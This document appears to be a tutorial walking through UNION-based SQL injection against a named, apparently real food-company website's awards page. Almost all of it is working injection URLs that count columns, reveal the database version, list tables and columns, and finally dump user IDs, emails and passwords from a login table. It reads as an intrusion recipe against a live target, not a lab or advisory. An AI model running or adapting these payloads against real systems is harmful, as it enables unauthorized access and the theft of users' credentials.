
---
 SQL injection is a technique where attackers insert malicious SQL queries into input fields, allowing them to execute arbitrary SQL commands on the database.

### 1. Basic Parameter Injection

**URL:**
```
http://bdfoods.com.bd/awards.php?id=6
```
**Description:**
This is a standard URL with an `id` parameter set to 6. It is used as the starting point to test if the parameter is vulnerable to SQL injection.

### 2. Testing for Order By Clause Injection

**URLs:**
```
http://bdfoods.com.bd/awards.php?id=6%20orderby1
http://bdfoods.com.bd/awards.php?id=6%20order%20by%202
http://bdfoods.com.bd/awards.php?id=6%20order%20by%203
http://bdfoods.com.bd/awards.php?id=6%20order%20by%204
```
**Description:**
These URLs attempt to manipulate the `id` parameter by adding an `ORDER BY` clause followed by a number. This technique is used to determine the number of columns in the resulting dataset. If the specified column number exceeds the actual number of columns, an error will occur, indicating how many columns are present. For example:
- `order by 1`: Orders by the first column.
- `order by 2`: Orders by the second column, and so on.

### 3. Testing for UNION-Based SQL Injection

**URLs:**
```
http://bdfoods.com.bd/awards.php?id=6%20union%20select%201,2,3,4
http://bdfoods.com.bd/awards.php?id=6%20union%20select%201,2,version(),4
```
**Description:**
These URLs use the `UNION` SQL operator to combine the results of two queries into a single result set. This method can be used to extract data from the database.
- `union select 1,2,3,4`: This query tests if the number of columns found earlier matches, and if the site is vulnerable to UNION-based SQL injection.
- `union select 1,2,version(),4`: Extracts the database version by replacing one of the column positions with the `version()` function.

### 4. Extracting Table Names

**URL:**
```
http://bdfoods.com.bd/awards.php?id=6%20union%20select%201,2,table_name,4%20from%20information_schema.tables
```
**Description:**
This URL retrieves the names of tables in the database by querying the `information_schema.tables` table, which stores metadata about the database schema. It uses `union select` to display the results in the webpage.

### 5. Extracting Column Names from a Specific Table

**URLs:**
```
http://bdfoods.com.bd/awards.php?id=6%20union%20select%201,2,column_name,4%20from%20information_schema.columns%20where%20table_name=%27u_log%27
http://bdfoods.com.bd/awards.php?id=6%20union%20select%201,2,column_name,4%20from%20information_schema.columns
```
**Description:**
These URLs list the column names from a specific table (`u_log`) or from all tables in the database. The `information_schema.columns` table contains metadata about all columns in the database.
- `where table_name='u_log'`: Filters the results to show columns from the `u_log` table.

### 6. Extracting Specific Data from a Table

**URL:**
```
http://bdfoods.com.bd/awards.php?id=6%20union%20select%201,2,group_concat(user_id,0x0a,u_em,0x0a,log__pass),4%20from%20u_log
```
**Description:**
This URL uses the `group_concat()` function to concatenate multiple rows into a single string, separating each entry with a newline (`0x0a`). It attempts to extract data such as `user_id`, `u_em` (presumably user email), and `log__pass` (password) from the `u_log` table.

---

